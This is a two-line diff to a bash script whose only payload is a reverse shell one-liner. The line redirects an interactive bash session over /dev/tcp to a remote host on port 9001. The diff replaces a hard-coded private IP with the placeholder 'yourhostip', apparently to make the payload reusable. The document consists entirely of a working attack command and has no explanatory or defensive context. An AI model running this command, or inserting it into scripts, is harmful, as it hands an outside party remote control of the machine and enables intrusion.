@@ -1,2 +1,2 @@
 #!/bin/bash
-bash -i >& /dev/tcp/192.168.11.69/9001 0>&1
+bash -i >& /dev/tcp/yourhostip/9001 0>&1
